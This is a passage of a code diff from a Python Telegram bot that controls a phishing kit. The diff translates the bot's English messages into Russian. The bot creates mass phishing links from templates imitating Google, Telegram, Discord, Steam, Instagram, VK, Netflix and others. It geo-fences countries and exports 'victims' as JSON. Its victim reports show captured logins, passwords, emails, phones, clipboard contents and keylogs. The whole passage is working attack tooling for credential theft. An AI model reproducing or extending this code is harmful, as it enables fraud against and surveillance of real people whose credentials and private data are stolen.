+        f"├ /campaign <name> <шаблон> <кол-во> — масс-ссылки\n"
+        f"└ /export <link_id> — экспорт данных жертв"
     )
 
     b = InlineKeyboardBuilder()
-    b.button(text="Toggle TG", callback_data="tog_tg")
-    b.button(text="Toggle Discord", callback_data="tog_dc")
-    b.button(text="⬅️ Back", callback_data="back_main")
+    b.button(text="TG уведомления", callback_data="tog_tg")
+    b.button(text="Discord уведомления", callback_data="tog_dc")
+    b.button(text="⬅️ Назад", callback_data="back_main")
     b.adjust(2)
     await cq.message.edit_text(text, reply_markup=b.as_markup())
     await cq.answer()
@@ -854,10 +852,10 @@ async def cb_tog_dc(cq: CallbackQuery):
 async def cmd_domain(message: Message, command: CommandObject):
     domain = command.args.strip() if command.args else ""
     if not domain:
-        await message.answer("Usage: /domain yourdomain.eu.cc")
+        await message.answer("Использование: /domain твойдомен.eu.cc")
         return
     await set_user_domain(message.from_user.id, domain)
-    await message.answer(f"✅ Domain set to: <code>{domain}</code>")
+    await message.answer(f"✅ Домен установлен: <code>{domain}</code>")
 
 @dp.message(Command("webhook"))
 async def cmd_webhook(message: Message, command: CommandObject):
@@ -865,9 +863,9 @@ async def cmd_webhook(message: Message, command: CommandObject):
     if args.startswith("discord "):
         url = args.replace("discord ", "", 1).strip()
         await set_webhook_discord(message.from_user.id, 1, url)
-        await message.answer("✅ Discord webhook set.")
+        await message.answer("✅ Discord webhook установлен.")
     else:
-        await message.answer("Usage: /webhook discord <url>")
+        await message.answer("Использование: /webhook discord <url>")
 
 @dp.message(Command("fence"))
 async def cmd_fence(message: Message, command: CommandObject):
@@ -875,43 +873,43 @@ async def cmd_fence(message: Message, command: CommandObject):
     if args.startswith("add "):
         country = args.replace("add ", "", 1).strip().upper()
         await add_geo_fence(message.from_user.id, country)
-        await message.answer(f"✅ Blocked country: {country}")
+        await message.answer(f"✅ Страна заблокирована: {country}")
     elif args == "list":
         fences = await get_geo_fences(message.from_user.id)
         if not fences:
-            await message.answer("No geo fences set.")
+            await message.answer("Гео-фенсы не установлены.")
             return
-        text = "<b>Geo Fences:</b>\n"
+        text = "<b>Гео-фенсы:</b>\n"
         for f in fences:
-            text += f"├ #{f['id']} | {f['country']} | action: {f['action']}\n"
+            text += f"├ #{f['id']} | {f['country']} | действие: {f['action']}\n"
         await message.answer(text)
     elif args.startswith("remove "):
         fid = args.replace("remove ", "", 1).strip()
         try:
             await remove_geo_fence(int(fid))
-            await message.answer("✅ Fence removed.")
+            await message.answer("✅ Фенс удалён.")
         except:
-            await message.answer("Invalid ID")
+            await message.answer("Неверный ID")
     else:
-        await message.answer("Usage: /fence add <country> | list | remove <id>")
+        await message.answer("Использование: /fence add <страна> | list | remove <id>")
 
 @dp.message(Command("campaign"))
 async def cmd_campaign(message: Message, command: CommandObject):
     args = command.args.strip() if command.args else ""
     parts = args.split()
     if len(parts) < 3:
-        await message.answer("Usage: /campaign <name> <template> <count>\nTemplates: cf, google, telegram, discord, steam, instagram, vk, netflix, age, update")
+        await message.answer("Использование: /campaign <название> <шаблон> <кол-во>\nШаблоны: cf, google, telegram, discord, steam, instagram, vk, netflix, age, update")
         return
 
     name, template, count_str = parts[0], parts[1], parts[2]
     try:
         count = min(int(count_str), 50)
     except:
-        await message.answer("Count must be a number (max 50)")
+        await message.answer("Количество должно быть числом (макс 50)")
         return
 
     if template not in LANDING_CACHE:
-        await message.answer(f"Unknown template: {template}. Available: {', '.join(LANDING_CACHE.keys())}")
+        await message.answer(f"Неизвестный шаблон: {template}. Доступны: {', '.join(LANDING_CACHE.keys())}")
         return
 
     campaign_id = generate_link_id()
@@ -928,10 +926,10 @@ async def cmd_campaign(message: Message, command: CommandObject):
         created += 1
 
     await message.answer(
-        f"✅ <b>Campaign created</b>\n"
-        f"├ Name: {name}\n"
-        f"├ Template: {template}\n"
-        f"├ Links: {created}\n"
+        f"✅ <b>Кампания создана</b>\n"
+        f"├ Название: {name}\n"
+        f"├ Шаблон: {template}\n"
+        f"├ Ссылок: {created}\n"
         f"├ /campaign_stats {campaign_id}"
     )
 
@@ -939,11 +937,11 @@ async def cmd_campaign(message: Message, command: CommandObject):
 async def cmd_campaign_stats(message: Message, command: CommandObject):
     cid = command.args.strip() if command.args else ""
     if not cid:
-        await message.answer("Usage: /campaign_stats <campaign_id>")
+        await message.answer("Использование: /campaign_stats <campaign_id>")
         return
     campaign = await get_campaign(cid)
     if not campaign:
-        await message.answer("Campaign not found")
+        await message.answer("Кампания не найдена")
         return
     links = await get_user_links(message.from_user.id)
 
@@ -952,25 +950,25 @@ async def cmd_campaign_stats(message: Message, command: CommandObject):
     camp_links = [l for l in links if l["campaign_id"] == cid]
 
     await message.answer(
-        f"<b>📊 Campaign: {campaign['name']}</b>\n"
-        f"├ Template: {campaign['template']}\n"
-        f"├ Links: {len(camp_links)}\n"
-        f"├ Total hits: {total_hits}\n"
-        f"├ Data received: {total_data}\n"
-        f"├ Created: {campaign['created_at']}\n"
-        f"└ Expires: {campaign['expires_at']}"
+        f"<b>📊 Кампания: {campaign['name']}</b>\n"
+        f"├ Шаблон: {campaign['template']}\n"
+        f"├ Ссылок: {len(camp_links)}\n"
+        f"├ Всего переходов: {total_hits}\n"
+        f"├ Данных получено: {total_data}\n"
+        f"├ Создана: {campaign['created_at']}\n"
+        f"└ Истекает: {campaign['expires_at']}"
     )
 
 @dp.message(Command("export"))
 async def cmd_export(message: Message, command: CommandObject):
     link_id = command.args.strip() if command.args else ""
     if not link_id:
-        await message.answer("Usage: /export <link_id> | /export all")
+        await message.answer("Использование: /export <link_id> | /export all")
         return
 
     victims = await get_victims(link_id) if link_id != "all" else []
     if not victims:
-        await message.answer("No victims found")
+        await message.answer("Жертвы не найдены")
         return
 
     data = [dict(v) for v in victims]
@@ -988,45 +986,45 @@ async def cmd_export(message: Message, command: CommandObject):
 
     await message.answer_document(
         BufferedInputFile(content, filename=f"victims_{link_id}.json"),
-        caption=f"📦 Exported {len(victims)} victims"
+        caption=f"📦 Экспортировано жертв: {len(victims)}"
     )
 
 @dp.message(Command("victim"))
 async def cmd_victim(message: Message, command: CommandObject):
     link_id = command.args.strip() if command.args else ""
     if not link_id:
-        await message.answer("Usage: /victim <link_id>")
+        await message.answer("Использование: /victim <link_id>")
         return
 
     victims = await get_victims(link_id)
     if not victims:
-        await message.answer("No victims for this link")
+        await message.answer("Жертв по этой ссылке нет")
         return
 
     v = victims[0]
     text = (
-        f"<b>🎯 Victim Report</b>\n"
+        f"<b>🎯 Отчёт по жертве</b>\n"
         f"├ IP: <code>{v['ip']}</code>\n"
-        f"├ Country: {v.get('country', '—')} / {v.get('city', '—')}\n"
+        f"├ Страна: {v.get('country', '—')} / {v.get('city', '—')}\n"
         f"├ ISP: {v.get('isp', '—')}\n"
-        f"├ Platform: {v.get('platform', '—')}\n"
-        f"├ Screen: {v.get('screen', '—')}\n"
-        f"├ Language: {v.get('language', '—')}\n"
-        f"├ Timezone: {v.get('timezone', '—')}\n"
-        f"├ VPN: {'⚠️ Yes' if v.get('vpn') else '✅ No'}\n"
+        f"├ Платформа: {v.get('platform', '—')}\n"
+        f"├ Экран: {v.get('screen', '—')}\n"
+        f"├ Язык: {v.get('language', '—')}\n"
+        f"├ Таймзона: {v.get('timezone', '—')}\n"
+        f"├ VPN: {'⚠️ Да' if v.get('vpn') else '✅ Нет'}\n"
     )
     if v.get("login"):
-        text += f"\n<b>✧ Credentials</b>\n"
-        text += f"├ Login: <code>{v['login']}</code>\n"
-        text += f"├ Password: <code>{v.get('password', '')}</code>\n"
+        text += f"\n<b>✧ Креды</b>\n"
+        text += f"├ Логин: <code>{v['login']}</code>\n"
+        text += f"├ Пароль: <code>{v.get('password', '')}</code>\n"
     if v.get("email"):
         text += f"├ Email: <code>{v['email']}</code>\n"
     if v.get("phone"):
-        text += f"├ Phone: <code>{v['phone']}</code>\n"
+        text += f"├ Телефон: <code>{v['phone']}</code>\n"
     if v.get("clipboard"):
-        text += f"\n<b>📋 Clipboard</b>\n<code>{v['clipboard'][:300]}</code>\n"
+        text += f"\n<b>📋 Буфер обмена</b>\n<code>{v['clipboard'][:300]}</code>\n"
     if v.get("keylog"):
-        text += f"\n<b>⌨️ Keylog</b>\n<code>{v['keylog'][:300]}</code>\n"
+        text += f"\n<b>⌨️ Кейлог</b>\n<code>{v['keylog'][:300]}</code>\n"
 
     await message.answer(text, disable_web_page_preview=True)
 
@@ -1034,9 +1032,9 @@ async def cmd_victim(message: Message, command: CommandObject):
 async def cmd_links(message: Message):
     links = await get_user_links(message.from_user.id)
     if not links:
-        await message.answer("No active links.")
+        await message.answer("Нет активных ссылок.")
         return
-    text = "<b>Your links:</b>\n"
+    text = "<b>Твои ссылки:</b>\n"
     for l in links[:15]:
         text += f"├ <code>{l['id'][:10]}</code> {l['template']} | 👁 {l['hits']}\n"
     await message.answer(text)
@@ -1050,12 +1048,12 @@ async def cmd_stats(message: Message):
     total_data = sum(l["data_received"] for l in links)
 
     await message.answer(
-        f"<b>📊 Global Stats</b>\n"
-        f"├ Active links: {len(links)}\n"
-        f"├ Total victims: {v_count}\n"
-        f"├ Total hits: {total_hits}\n"
-        f"├ Data received: {total_data}\n"
-        f"├ Conversion rate: {(total_data/total_hits*100) if total_hits else 0:.1f}%"
+        f"<b>📊 Общая статистика</b>\n"
+        f"├ Активных ссылок: {len(links)}\n"
+        f"├ Всего жертв: {v_count}\n"
+        f"├ Всего переходов: {total_hits}\n"
+        f"├ Данных получено: {total_data}\n"
+        f"├ Конверсия: {(total_data/total_hits*100) if total_hits else 0:.1f}%"
     )
 
 # ── ЗАПУСК ──
